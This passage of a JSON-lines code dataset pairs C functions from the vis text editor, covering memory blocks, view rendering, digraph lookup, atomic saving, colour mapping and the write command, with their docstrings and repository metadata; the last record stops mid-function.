{"docstring": "/* allocate a new block of MAX(size, BLOCK_SIZE) bytes */\n", "func_signal": "Block *block_alloc(size_t size)", "code": "{\n\tBlock *blk = calloc(1, sizeof *blk);\n\tif (!blk)\n\t\treturn NULL;\n\tif (BLOCK_SIZE > size)\n\t\tsize = BLOCK_SIZE;\n\tif (!(blk->data = malloc(size))) {\n\t\tfree(blk);\n\t\treturn NULL;\n\t}\n\tblk->type = BLOCK_TYPE_MALLOC;\n\tblk->size = size;\n\treturn blk;\n}", "path": "vis/text-io.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/** mode switching event handlers */\n", "func_signal": "static void vis_mode_normal_enter(Vis *vis, Mode *old)", "code": "{\n\tWin *win = vis->win;\n\tif (!win)\n\t\treturn;\n\tif (old != mode_get(vis, VIS_MODE_INSERT) && old != mode_get(vis, VIS_MODE_REPLACE))\n\t\treturn;\n\tif (vis->autoindent && strcmp(vis->key_prev, \"<Enter>\") == 0) {\n\t\tText *txt = win->file->text;\n\t\tfor (Selection *s = view_selections(win->view); s; s = view_selections_next(s)) {\n\t\t\tsize_t pos = view_cursors_pos(s);\n\t\t\tsize_t start = text_line_start(txt, pos);\n\t\t\tsize_t end = text_line_end(txt, pos);\n\t\t\tif (start == pos && start == end) {\n\t\t\t\tsize_t begin = text_line_begin(txt, pos);\n\t\t\t\tsize_t len = start - begin;\n\t\t\t\tif (len) {\n\t\t\t\t\ttext_delete(txt, begin, len);\n\t\t\t\t\tview_cursors_to(s, pos-len);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tmacro_operator_stop(vis);\n\tif (!win->parent && vis->action_prev.op == &vis_operators[VIS_OP_MODESWITCH] &&\n\t    vis->action_prev.count > 1) {\n\t\t/* temporarily disable motion, in something like `5atext`\n\t\t * we should only move the cursor once then insert the text */\n\t\tconst Movement *motion = vis->action_prev.movement;\n\t\tif (motion)\n\t\t\tvis->action_prev.movement = &vis_motions[VIS_MOVE_NOP];\n\t\t/* we already inserted the text once, so temporarily decrease count */\n\t\tvis->action_prev.count--;\n\t\tvis_repeat(vis);\n\t\tvis->action_prev.count++;\n\t\tvis->action_prev.movement = motion;\n\t}\n\t/* make sure we can recover the current state after an editing operation */\n\tvis_file_snapshot(vis, win->file);\n}", "path": "vis/vis-modes.c", "commit_date": "2020-02-04 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* append data to block, assumes there is enough space available */\n", "func_signal": "const char *block_append(Block *blk, const char *data, size_t len)", "code": "{\n\tchar *dest = memcpy(blk->data + blk->len, data, len);\n\tblk->len += len;\n\treturn dest;\n}", "path": "vis/text-io.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* program exit status:\n *  0 -> success\n *  1 -> invalid\n *  2 -> prefix\n *  3 -> error\n */\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n\tsetlocale(LC_ALL, \"\");\n\n\tif (argc == 1) {\n\t\tfor (const Digraph *d = digraphs; d->name[0]; d++)\n\t\t\twprintf(L\"%s %lc %s\\n\", d->name, d->rune, d->description);\n\t\treturn 0;\n\t}\n\n\tif (strcmp(argv[1], \"-\") == 0) {\n\t\tsetup();\n\t\tchar name[MAX_DIGRAPH_LENGTH+1] = \"\";\n\t\tfor (size_t i = 0; i < sizeof(name)-1; i++) {\n\t\t\tssize_t r = readc(name+i);\n\t\t\tif (r == -1) {\n\t\t\t\tcleanup();\n\t\t\t\tfputs(\"I/O error\", stderr);\n\t\t\t\treturn 3;\n\t\t\t}\n\n\t\t\twchar_t rune;\n\t\t\tint l = lookup(name, &rune);\n\t\t\tif (l == 0 || (l == -1 && r == 0)) {\n\t\t\t\tcleanup();\n\t\t\t\tfprintf(stderr, \"Unknown digraph: `%s'\\n\", name);\n\t\t\t\treturn 1;\n\t\t\t} else if (l == 1) {\n\t\t\t\tcleanup();\n\t\t\t\tputwchar(rune);\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t}\n\t\tcleanup();\n\t\treturn 1;\n\t}\n\n\twchar_t *runes = calloc(argc-1, sizeof(runes[0]));\n\tif (!runes) {\n\t\tperror(NULL);\n\t\treturn 1;\n\t}\n\n\tfor (int i = 1; i < argc; i++) {\n\t\tint l = lookup(argv[i], &runes[i-1]);\n\t\tif (l == 0) {\n\t\t\tfprintf(stderr, \"Unknown digraph: `%s'\\n\", argv[i]);\n\t\t\treturn 1;\n\t\t} else if (l == -1) {\n\t\t\treturn 2;\n\t\t}\n\t}\n\n\tfor (int i = 0; i < argc-1; i++)\n\t\tputwchar(runes[i]);\n\treturn 0;\n}", "path": "vis/vis-digraph.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* try to add another character to the view, return whether there was space left */\n", "func_signal": "static bool view_addch(View *view, Cell *cell)", "code": "{\n\tif (!view->line)\n\t\treturn false;\n\n\tint width;\n\tsize_t lineno = view->line->lineno;\n\tunsigned char ch = (unsigned char)cell->data[0];\n\tcell->style = view->cell_blank.style;\n\n\tswitch (ch) {\n\tcase '\\t':\n\t\tcell->width = 1;\n\t\twidth = view->tabwidth - (view->col % view->tabwidth);\n\t\tfor (int w = 0; w < width; w++) {\n\t\t\tif (view->col + 1 > view->width) {\n\t\t\t\tview->line = view->line->next;\n\t\t\t\tview->col = 0;\n\t\t\t\tif (!view->line)\n\t\t\t\t\treturn false;\n\t\t\t\tview->line->lineno = lineno;\n\t\t\t}\n\n\t\t\tcell->len = w == 0 ? 1 : 0;\n\t\t\tint t = w == 0 ? SYNTAX_SYMBOL_TAB : SYNTAX_SYMBOL_TAB_FILL;\n\t\t\tstrncpy(cell->data, view->symbols[t]->symbol, sizeof(cell->data)-1);\n\t\t\tview->line->cells[view->col] = *cell;\n\t\t\tview->line->len += cell->len;\n\t\t\tview->line->width += cell->width;\n\t\t\tview->col++;\n\t\t}\n\t\tcell->len = 1;\n\t\treturn true;\n\tcase '\\n':\n\t\tcell->width = 1;\n\t\tif (view->col + cell->width > view->width) {\n\t\t\tview->line = view->line->next;\n\t\t\tview->col = 0;\n\t\t\tif (!view->line)\n\t\t\t\treturn false;\n\t\t\tview->line->lineno = lineno;\n\t\t}\n\n\t\tstrncpy(cell->data, view->symbols[SYNTAX_SYMBOL_EOL]->symbol, sizeof(cell->data)-1);\n\n\t\tview->line->cells[view->col] = *cell;\n\t\tview->line->len += cell->len;\n\t\tview->line->width += cell->width;\n\t\tfor (int i = view->col + 1; i < view->width; i++)\n\t\t\tview->line->cells[i] = view->cell_blank;\n\n\t\tview->line = view->line->next;\n\t\tif (view->line)\n\t\t\tview->line->lineno = lineno + 1;\n\t\tview->col = 0;\n\t\treturn true;\n\tdefault:\n\t\tif (ch < 128 && !isprint(ch)) {\n\t\t\t/* non-printable ascii char, represent it as ^(char + 64) */\n\t\t\t*cell = (Cell) {\n\t\t\t\t.data = { '^', ch == 127 ? '?' : ch + 64, '\\0' },\n\t\t\t\t.len = 1,\n\t\t\t\t.width = 2,\n\t\t\t\t.style = cell->style,\n\t\t\t};\n\t\t}\n\n\t\tif (ch == ' ') {\n\t\t\tstrncpy(cell->data, view->symbols[SYNTAX_SYMBOL_SPACE]->symbol, sizeof(cell->data)-1);\n\n\t\t}\n\n\t\tif (view->col + cell->width > view->width) {\n\t\t\tfor (int i = view->col; i < view->width; i++)\n\t\t\t\tview->line->cells[i] = view->cell_blank;\n\t\t\tview->line = view->line->next;\n\t\t\tview->col = 0;\n\t\t}\n\n\t\tif (view->line) {\n\t\t\tview->line->width += cell->width;\n\t\t\tview->line->len += cell->len;\n\t\t\tview->line->lineno = lineno;\n\t\t\tview->line->cells[view->col] = *cell;\n\t\t\tview->col++;\n\t\t\t/* set cells of a character which uses multiple columns */\n\t\t\tfor (int i = 1; i < cell->width; i++)\n\t\t\t\tview->line->cells[view->col++] = cell_unused;\n\t\t\treturn true;\n\t\t}\n\t\treturn false;\n\t}\n}", "path": "vis/view.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* Closest key to this in a non-empty map. */\n", "func_signal": "static Map *closest(Map *n, const char *key)", "code": "{\n\tsize_t len = strlen(key);\n\tconst uint8_t *bytes = (const uint8_t *)key;\n\n\t/* Anything with NULL value is an internal node. */\n\twhile (!n->v) {\n\t\tuint8_t direction = 0;\n\n\t\tif (n->u.n->byte_num < len) {\n\t\t\tuint8_t c = bytes[n->u.n->byte_num];\n\t\t\tdirection = (c >> n->u.n->bit_num) & 1;\n\t\t}\n\t\tn = &n->u.n->child[direction];\n\t}\n\treturn n;\n}", "path": "vis/map.c", "commit_date": "2020-11-13 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* parse human-readable boolean value in s. If successful, store the result in\n * outval and return true. Else return false and leave outval alone. */\n", "func_signal": "static bool parse_bool(const char *s, bool *outval)", "code": "{\n\tfor (const char **t = (const char*[]){\"1\", \"true\", \"yes\", \"on\", NULL}; *t; t++) {\n\t\tif (!strcasecmp(s, *t)) {\n\t\t\t*outval = true;\n\t\t\treturn true;\n\t\t}\n\t}\n\tfor (const char **f = (const char*[]){\"0\", \"false\", \"no\", \"off\", NULL}; *f; f++) {\n\t\tif (!strcasecmp(s, *f)) {\n\t\t\t*outval = false;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}", "path": "vis/vis-cmds.c", "commit_date": "2020-11-13 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* redraw the complete with data starting from view->start bytes into the file.\n * stop once the screen is full, update view->end, view->lastline */\n", "func_signal": "void view_draw(View *view)", "code": "{\n\tview_clear(view);\n\t/* read a screenful of text considering each character as 4-byte UTF character*/\n\tconst size_t size = view->width * view->height * 4;\n\t/* current buffer to work with */\n\tchar *text = view->textbuf;\n\t/* remaining bytes to process in buffer */\n\tsize_t rem = text_bytes_get(view->text, view->start, size, text);\n\t/* NUL terminate text section */\n\ttext[rem] = '\\0';\n\t/* absolute position of character currently being added to display */\n\tsize_t pos = view->start;\n\t/* current position into buffer from which to interpret a character */\n\tchar *cur = text;\n\t/* start from known multibyte state */\n\tmbstate_t mbstate = { 0 };\n\n\tCell cell = { .data = \"\", .len = 0, .width = 0, }, prev_cell = cell;\n\n\twhile (rem > 0) {\n\n\t\t/* current 'parsed' character' */\n\t\twchar_t wchar;\n\n\t\tsize_t len = mbrtowc(&wchar, cur, rem, &mbstate);\n\t\tif (len == (size_t)-1 && errno == EILSEQ) {\n\t\t\t/* ok, we encountered an invalid multibyte sequence,\n\t\t\t * replace it with the Unicode Replacement Character\n\t\t\t * (FFFD) and skip until the start of the next utf8 char */\n\t\t\tmbstate = (mbstate_t){0};\n\t\t\tfor (len = 1; rem > len && !ISUTF8(cur[len]); len++);\n\t\t\tcell = (Cell){ .data = \"\\xEF\\xBF\\xBD\", .len = len, .width = 1 };\n\t\t} else if (len == (size_t)-2) {\n\t\t\t/* not enough bytes available to convert to a\n\t\t\t * wide character. Advance file position and read\n\t\t\t * another junk into buffer.\n\t\t\t */\n\t\t\trem = text_bytes_get(view->text, pos+prev_cell.len, size, text);\n\t\t\ttext[rem] = '\\0';\n\t\t\tcur = text;\n\t\t\tcontinue;\n\t\t} else if (len == 0) {\n\t\t\t/* NUL byte encountered, store it and continue */\n\t\t\tcell = (Cell){ .data = \"\\x00\", .len = 1, .width = 2 };\n\t\t} else {\n\t\t\tif (len >= sizeof(cell.data))\n\t\t\t\tlen = sizeof(cell.data)-1;\n\t\t\tfor (size_t i = 0; i < len; i++)\n\t\t\t\tcell.data[i] = cur[i];\n\t\t\tcell.data[len] = '\\0';\n\t\t\tcell.len = len;\n\t\t\tcell.width = wcwidth(wchar);\n\t\t\tif (cell.width == -1)\n\t\t\t\tcell.width = 1;\n\t\t}\n\n\t\tif (cell.width == 0) {\n\t\t\tstrncat(prev_cell.data, cell.data, sizeof(prev_cell.data)-strlen(prev_cell.data)-1);\n\t\t\tprev_cell.len += cell.len;\n\t\t} else {\n\t\t\tif (prev_cell.len && !view_addch(view, &prev_cell))\n\t\t\t\tbreak;\n\t\t\tpos += prev_cell.len;\n\t\t\tprev_cell = cell;\n\t\t}\n\n \t\trem -= cell.len;\n\t\tcur += cell.len;\n\n\t\tmemset(&cell, 0, sizeof cell);\n\t}\n\n\tif (prev_cell.len && view_addch(view, &prev_cell))\n\t\tpos += prev_cell.len;\n\n\t/* set end of viewing region */\n\tview->end = pos;\n\tif (view->line) {\n\t\tbool eof = view->end == text_size(view->text);\n\t\tif (view->line->len == 0 && eof && view->line->prev)\n\t\t\tview->lastline = view->line->prev;\n\t\telse\n\t\t\tview->lastline = view->line;\n\t} else {\n\t\tview->lastline = view->bottomline;\n\t}\n\n\t/* clear remaining of line, important to show cursor at end of file */\n\tif (view->line) {\n\t\tfor (int x = view->col; x < view->width; x++)\n\t\t\tview->line->cells[x] = view->cell_blank;\n\t}\n\n\t/* resync position of cursors within visible area */\n\tfor (Selection *s = view->selections; s; s = s->next) {\n\t\tsize_t pos = view_cursors_pos(s);\n\t\tif (!view_coord_get(view, pos, &s->line, &s->row, &s->col) &&\n\t\t    s == view->selection) {\n\t\t\ts->line = view->topline;\n\t\t\ts->row = 0;\n\t\t\ts->col = 0;\n\t\t}\n\t}\n\n\tview->need_update = true;\n}", "path": "vis/view.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "// return values: 0 (not found), 1 (found), -1 (prefix)\n", "func_signal": "static int lookup(const char *name, wchar_t *rune)", "code": "{\n\tsize_t len = strlen(name);\n\tfor (const Digraph *d = digraphs; d->name[0]; d++) {\n\t\tif (strncmp(name, d->name, len) == 0) {\n\t\t\t*rune = d->rune;\n\t\t\treturn d->name[len] == '\\0' ? 1 : -1;\n\t\t}\n\t}\n\treturn 0;\n}", "path": "vis/vis-digraph.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* reset internal view data structures (cell matrix, line offsets etc.) */\n", "func_signal": "static void view_clear(View *view)", "code": "{\n\tmemset(view->lines, 0, view->lines_size);\n\tif (view->start != view->start_last) {\n\t\tif (view->start == 0)\n\t\t\tview->start_mark = EMARK;\n\t\telse\n\t\t\tview->start_mark = text_mark_set(view->text, view->start);\n\t} else {\n\t\tsize_t start;\n\t\tif (view->start_mark == EMARK)\n\t\t\tstart = 0;\n\t\telse\n\t\t\tstart = text_mark_get(view->text, view->start_mark);\n\t\tif (start != EPOS)\n\t\t\tview->start = start;\n\t}\n\n\tview->start_last = view->start;\n\tview->topline = view->lines;\n\tview->topline->lineno = view->large_file ? 1 : text_lineno_by_pos(view->text, view->start);\n\tview->lastline = view->topline;\n\n\tsize_t line_size = sizeof(Line) + view->width*sizeof(Cell);\n\tsize_t end = view->height * line_size;\n\tLine *prev = NULL;\n\tfor (size_t i = 0; i < end; i += line_size) {\n\t\tLine *line = (Line*)(((char*)view->lines) + i);\n\t\tline->prev = prev;\n\t\tif (prev)\n\t\t\tprev->next = line;\n\t\tprev = line;\n\t}\n\tview->bottomline = prev ? prev : view->topline;\n\tview->bottomline->next = NULL;\n\tview->line = view->topline;\n\tview->col = 0;\n\tif (view->ui)\n\t\tview->cell_blank.style = view->ui->style_get(view->ui, UI_STYLE_DEFAULT);\n}", "path": "vis/view.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* Create a new file named `.filename.vis.XXXXXX` (where `XXXXXX` is a\n * randomly generated, unique suffix) and try to preserve all important\n * meta data. After the file content has been written to this temporary\n * file, text_save_commit_atomic will atomically move it to  its final\n * (possibly already existing) destination using rename(2).\n *\n * This approach does not work if:\n *\n *   - the file is a symbolic link\n *   - the file is a hard link\n *   - file ownership can not be preserved\n *   - file group can not be preserved\n *   - directory permissions do not allow creation of a new file\n *   - POSIX ACL can not be preserved (if enabled)\n *   - SELinux security context can not be preserved (if enabled)\n */\n", "func_signal": "static bool text_save_begin_atomic(TextSave *ctx)", "code": "{\n\tint oldfd, saved_errno;\n\tif ((oldfd = openat(ctx->dirfd, ctx->filename, O_RDONLY)) == -1 && errno != ENOENT)\n\t\tgoto err;\n\tstruct stat oldmeta = { 0 };\n\tif (oldfd != -1 && fstatat(ctx->dirfd, ctx->filename, &oldmeta, AT_SYMLINK_NOFOLLOW) == -1)\n\t\tgoto err;\n\tif (oldfd != -1) {\n\t\tif (S_ISLNK(oldmeta.st_mode)) /* symbolic link */\n\t\t\tgoto err;\n\t\tif (oldmeta.st_nlink > 1) /* hard link */\n\t\t\tgoto err;\n\t}\n\n\tchar suffix[] = \".vis.XXXXXX\";\n\tsize_t len = strlen(ctx->filename) + sizeof(\"./.\") + sizeof(suffix);\n\tchar *dir = strdup(ctx->filename);\n\tchar *base = strdup(ctx->filename);\n\n\tif (!(ctx->tmpname = malloc(len)) || !dir || !base) {\n\t\tfree(dir);\n\t\tfree(base);\n\t\tgoto err;\n\t}\n\n\tsnprintf(ctx->tmpname, len, \"%s/.%s%s\", dirname(dir), basename(base), suffix);\n\tfree(dir);\n\tfree(base);\n\n\tif ((ctx->fd = mkstempat(ctx->dirfd, ctx->tmpname)) == -1)\n\t\tgoto err;\n\n\tif (oldfd == -1) {\n\t\tmode_t mask = umask(0);\n\t\tumask(mask);\n\t\tif (fchmod(ctx->fd, 0666 & ~mask) == -1)\n\t\t\tgoto err;\n\t} else {\n\t\tif (fchmod(ctx->fd, oldmeta.st_mode) == -1)\n\t\t\tgoto err;\n\t\tif (!preserve_acl(oldfd, ctx->fd) || !preserve_selinux_context(oldfd, ctx->fd))\n\t\t\tgoto err;\n\t\t/* change owner if necessary */\n\t\tif (oldmeta.st_uid != getuid() && fchown(ctx->fd, oldmeta.st_uid, (uid_t)-1) == -1)\n\t\t\tgoto err;\n\t\t/* change group if necessary, in case of failure some editors reset\n\t\t * the group permissions to the same as for others */\n\t\tif (oldmeta.st_gid != getgid() && fchown(ctx->fd, (uid_t)-1, oldmeta.st_gid) == -1)\n\t\t\tgoto err;\n\t\tclose(oldfd);\n\t}\n\n\tctx->type = TEXT_SAVE_ATOMIC;\n\treturn true;\nerr:\n\tsaved_errno = errno;\n\tif (oldfd != -1)\n\t\tclose(oldfd);\n\tif (ctx->fd != -1)\n\t\tclose(ctx->fd);\n\tctx->fd = -1;\n\tfree(ctx->tmpname);\n\tctx->tmpname = NULL;\n\terrno = saved_errno;\n\treturn false;\n}", "path": "vis/text-io.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* Work out the nearest color from the 256 color set, or perhaps exactly. */\n", "func_signal": "static CellColor color_rgb(UiTerm *ui, uint8_t r, uint8_t g, uint8_t b)", "code": "{\n\tif (change_colors == -1)\n\t\tchange_colors = ui->vis->change_colors && can_change_color() && COLORS >= 256;\n\tif (change_colors) {\n\t\tuint32_t hexrep = ((r << 16) | (g << 8) | b) + 1;\n\t\tfor (short i = 0; i < MAX_COLOR_CLOBBER; ++i) {\n\t\t\tif (clobbering_colors[i] == hexrep)\n\t\t\t\treturn i + 16;\n\t\t\telse if (!clobbering_colors[i])\n\t\t\t\tbreak;\n\t\t}\n\n\t\tshort i = color_clobber_idx;\n\t\tclobbering_colors[i] = hexrep;\n\t\tinit_color(i + 16, (r * 1000) / 0xff, (g * 1000) / 0xff,\n\t\t           (b * 1000) / 0xff);\n\n\t\t/* in the unlikely case a user requests this many colors, reuse old slots */\n\t\tif (++color_clobber_idx >= MAX_COLOR_CLOBBER)\n\t\t\tcolor_clobber_idx = 0;\n\n\t\treturn i + 16;\n\t}\n\n\tstatic const unsigned char color_256_to_16[256] = {\n\t\t 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15,\n\t\t 0,  4,  4,  4, 12, 12,  2,  6,  4,  4, 12, 12,  2,  2,  6,  4,\n\t\t12, 12,  2,  2,  2,  6, 12, 12, 10, 10, 10, 10, 14, 12, 10, 10,\n\t\t10, 10, 10, 14,  1,  5,  4,  4, 12, 12,  3,  8,  4,  4, 12, 12,\n\t\t 2,  2,  6,  4, 12, 12,  2,  2,  2,  6, 12, 12, 10, 10, 10, 10,\n\t\t14, 12, 10, 10, 10, 10, 10, 14,  1,  1,  5,  4, 12, 12,  1,  1,\n\t\t 5,  4, 12, 12,  3,  3,  8,  4, 12, 12,  2,  2,  2,  6, 12, 12,\n\t\t10, 10, 10, 10, 14, 12, 10, 10, 10, 10, 10, 14,  1,  1,  1,  5,\n\t\t12, 12,  1,  1,  1,  5, 12, 12,  1,  1,  1,  5, 12, 12,  3,  3,\n\t\t 3,  7, 12, 12, 10, 10, 10, 10, 14, 12, 10, 10, 10, 10, 10, 14,\n\t\t 9,  9,  9,  9, 13, 12,  9,  9,  9,  9, 13, 12,  9,  9,  9,  9,\n\t\t13, 12,  9,  9,  9,  9, 13, 12, 11, 11, 11, 11,  7, 12, 10, 10,\n\t\t10, 10, 10, 14,  9,  9,  9,  9,  9, 13,  9,  9,  9,  9,  9, 13,\n\t\t 9,  9,  9,  9,  9, 13,  9,  9,  9,  9,  9, 13,  9,  9,  9,  9,\n\t\t 9, 13, 11, 11, 11, 11, 11, 15,  0,  0,  0,  0,  0,  0,  8,  8,\n\t\t 8,  8,  8,  8,  7,  7,  7,  7,  7,  7, 15, 15, 15, 15, 15, 15\n\t};\n\n\tint i = 0;\n\tif ((!r || (r - 55) % 40 == 0) &&\n\t    (!g || (g - 55) % 40 == 0) &&\n\t    (!b || (b - 55) % 40 == 0)) {\n\t\ti = 16;\n\t\ti += r ? ((r - 55) / 40) * 36 : 0;\n\t\ti += g ? ((g - 55) / 40) * 6 : 0;\n\t\ti += g ? ((b - 55) / 40) : 0;\n\t} else if (r == g && g == b && (r - 8) % 10 == 0 && r < 239) {\n\t\ti = 232 + ((r - 8) / 10);\n\t} else {\n\t\tunsigned lowest = UINT_MAX;\n\t\tfor (int j = 16; j < 256; ++j) {\n\t\t\tint jr = 0, jg = 0, jb = 0;\n\t\t\tget_6cube_rgb(j, &jr, &jg, &jb);\n\t\t\tint dr = jr - r;\n\t\t\tint dg = jg - g;\n\t\t\tint db = jb - b;\n\t\t\tunsigned int distance = dr * dr + dg * dg + db * db;\n\t\t\tif (distance < lowest) {\n\t\t\t\tlowest = distance;\n\t\t\t\ti = j;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (COLORS <= 16)\n\t\treturn color_256_to_16[i];\n\treturn i;\n}", "path": "vis/ui-terminal-curses.c", "commit_date": "2020-03-17 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* insert data into block at an arbitrary position, this should only be used with\n * data of the most recently created piece. */\n", "func_signal": "bool block_insert(Block *blk, size_t pos, const char *data, size_t len)", "code": "{\n\tif (pos > blk->len || !block_capacity(blk, len))\n\t\treturn false;\n\tif (blk->len == pos)\n\t\treturn block_append(blk, data, len);\n\tchar *insert = blk->data + pos;\n\tmemmove(insert + len, insert, blk->len - pos);\n\tmemcpy(insert, data, len);\n\tblk->len += len;\n\treturn true;\n}", "path": "vis/text-io.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/** window / file handling */\n", "func_signal": "static void file_free(Vis *vis, File *file)", "code": "{\n\tif (!file)\n\t\treturn;\n\tif (file->refcount > 1) {\n\t\t--file->refcount;\n\t\treturn;\n\t}\n\tvis_event_emit(vis, VIS_EVENT_FILE_CLOSE, file);\n\tfor (size_t i = 0; i < LENGTH(file->marks); i++)\n\t\tmark_release(&file->marks[i]);\n\ttext_free(file->text);\n\tfree((char*)file->name);\n\n\tif (file->prev)\n\t\tfile->prev->next = file->next;\n\tif (file->next)\n\t\tfile->next->prev = file->prev;\n\tif (vis->files == file)\n\t\tvis->files = file->next;\n\tfree(file);\n}", "path": "vis/vis.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* Reset color palette to default values using OSC 104 */\n", "func_signal": "static void undo_palette(void)", "code": "{\n\tfputs(\"\\033]104;\\a\", stderr);\n\tfflush(stderr);\n}", "path": "vis/ui-terminal-curses.c", "commit_date": "2020-03-17 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* process text input, substitute register content for backreferences etc. */\n", "func_signal": "Buffer text(Vis *vis, const char *text)", "code": "{\n\tBuffer buf;\n\tbuffer_init(&buf);\n\tfor (size_t len = strcspn(text, \"\\\\&\"); *text; len = strcspn(++text, \"\\\\&\")) {\n\t\tbuffer_append(&buf, text, len);\n\t\ttext += len;\n\t\tenum VisRegister regid = VIS_REG_INVALID;\n\t\tswitch (text[0]) {\n\t\tcase '&':\n\t\t\tregid = VIS_REG_AMPERSAND;\n\t\t\tbreak;\n\t\tcase '\\\\':\n\t\t\tif ('1' <= text[1] && text[1] <= '9') {\n\t\t\t\tregid = VIS_REG_1 + text[1] - '1';\n\t\t\t\ttext++;\n\t\t\t} else if (text[1] == '\\\\' || text[1] == '&') {\n\t\t\t\ttext++;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase '\\0':\n\t\t\tgoto out;\n\t\t}\n\n\t\tconst char *data;\n\t\tsize_t reglen = 0;\n\t\tif (regid != VIS_REG_INVALID) {\n\t\t\tdata = register_get(vis, &vis->registers[regid], &reglen);\n\t\t} else {\n\t\t\tdata = text;\n\t\t\treglen = 1;\n\t\t}\n\t\tbuffer_append(&buf, data, reglen);\n\t}\nout:\n\treturn buf;\n}", "path": "vis/sam.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* Calculate r,g,b components of one of the standard upper 240 colors */\n", "func_signal": "static void get_6cube_rgb(unsigned int n, int *r, int *g, int *b)", "code": "{\n\tif (n < 16) {\n\t\treturn;\n\t} else if (n < 232) {\n\t\tn -= 16;\n\t\t*r = (n / 36) ? (n / 36) * 40 + 55 : 0;\n\t\t*g = ((n / 6) % 6) ? ((n / 6) % 6) * 40 + 55 : 0;\n\t\t*b = (n % 6) ? (n % 6) * 40 + 55 : 0;\n\t} else if (n < 256) {\n\t\tn -= 232;\n\t\t*r = n * 10 + 8;\n\t\t*g = n * 10 + 8;\n\t\t*b = n * 10 + 8;\n\t}\n}", "path": "vis/ui-terminal-curses.c", "commit_date": "2020-03-17 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* cmd_write stores win->file's contents end emits pre/post events.\n * If the range r covers the whole file, it is updated to account for\n * potential file's text mutation by a FILE_SAVE_PRE callback.\n */\n", "func_signal": "static bool cmd_write(Vis *vis, Win *win, Command *cmd, const char *argv[], Selection *sel, Filerange *r)", "code": "{\n\tif (!win)\n\t\treturn false;\n\n\tFile *file = win->file;\n\tif (sam_transcript_error(&file->transcript, SAM_ERR_WRITE_CONFLICT))\n\t\treturn false;\n\n\tText *text = file->text;\n\tFilerange range_all = text_range_new(0, text_size(text));\n\tbool write_entire_file = text_range_equal(r, &range_all);\n\n\tconst char *filename = argv[1];\n\tif (!filename)\n\t\tfilename = file->name;\n\tif (!filename) {\n\t\tif (file->fd == -1) {\n\t\t\tvis_info_show(vis, \"Filename expected\");\n\t\t\treturn false;\n\t\t}\n\t\tif (!strchr(argv[0], 'q')) {\n\t\t\tvis_info_show(vis, \"No filename given, use 'wq' to write to stdout\");\n\t\t\treturn false;\n\t\t}\n\n\t\tif (!vis_event_emit(vis, VIS_EVENT_FILE_SAVE_PRE, file, (char*)NULL) && cmd->flags != '!') {\n\t\t\tvis_info_show(vis, \"Rejected write to stdout by pre-save hook\");\n\t\t\treturn false;\n\t\t}\n\t\t/* a pre-save hook may have changed the text; need to re-take the range */\n\t\tif (write_entire_file)\n\t\t\t*r = text_range_new(0, text_size(text));\n\n\t\tbool visual = vis->mode->visual;\n\n\t\tfor (Selection *s = view_selections(win->view); s; s = view_selections_next(s)) {\n\t\t\tFilerange range = visual ? view_selections_get(s) : *r;\n\t\t\tssize_t written = text_write_range(text, &range, file->fd);\n\t\t\tif (written == -1 || (size_t)written != text_range_size(&range)) {\n\t\t\t\tvis_info_show(vis, \"Can not write to stdout\");\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tif (!visual)\n\t\t\t\tbreak;\n\t\t}\n\n\t\t/* make sure the file is marked as saved i.e. not modified */\n\t\ttext_save(text, NULL);\n\t\tvis_event_emit(vis, VIS_EVENT_FILE_SAVE_POST, file, (char*)NULL);\n\t\treturn true;\n\t}\n\n\tif (!argv[1] && cmd->flags != '!') {\n\t\tif (vis->mode->visual) {\n\t\t\tvis_info_show(vis, \"WARNING: file will be reduced to active selection\");\n\t\t\treturn false;\n\t\t}\n\t\tif (!write_entire_file) {\n\t\t\tvis_info_show(vis, \"WARNING: file will be reduced to provided range\");\n\t\t\treturn false;\n\t\t}\n\t}\n\n\tfor (const char **name = argv[1] ? &argv[1] : (const char*[]){ filename, NULL }; *name; name++) {\n\n\t\tchar *path = absolute_path(*name);\n\t\tif (!path)\n\t\t\treturn 